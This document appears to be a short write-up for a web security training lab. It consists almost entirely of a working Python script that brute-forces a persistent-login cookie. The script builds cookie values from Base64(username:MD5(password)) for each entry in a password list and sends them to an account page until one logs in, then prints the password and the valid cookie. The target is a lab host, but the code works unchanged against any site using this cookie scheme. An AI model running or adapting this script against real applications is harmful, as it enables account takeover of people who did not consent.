# 🐍 Python Automation Script for Stay-Logged-In Cookie Brute-Forcing

This script automates generating and testing `stay-logged-in` cookies formatted as `Base64(username:MD5(password))` against a target application endpoint.

```python
import hashlib
import base64
import requests

TARGET_URL = "https://target-app.web-security-academy.net/my-account"
TARGET_USER = "carlos"
PASSWORDS_FILE = "passwords.txt"

def generate_cookie(username, password):
    md5_pass = hashlib.md5(password.encode()).hexdigest()
    raw_str = f"{username}:{md5_pass}"
    return base64.b64encode(raw_str.encode()).decode()

def brute_force():
    with open(PASSWORDS_FILE, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Starting brute force for user: {TARGET_USER}")
    for pwd in passwords:
        cookie_val = generate_cookie(TARGET_USER, pwd)
        cookies = {"stay-logged-in": cookie_val}
        params = {"id": TARGET_USER}
        
        resp = requests.get(TARGET_URL, params=params, cookies=cookies, allow_redirects=False)
        if resp.status_code == 200 and "Log out" in resp.text:
            print(f"[+] SUCCESS! Password found: {pwd}")
            print(f"[+] Valid Cookie: stay-logged-in={cookie_val}")
            return pwd

    print("[-] Brute force complete. No valid password found.")
    return None

if __name__ == "__main__":
    brute_force()
```
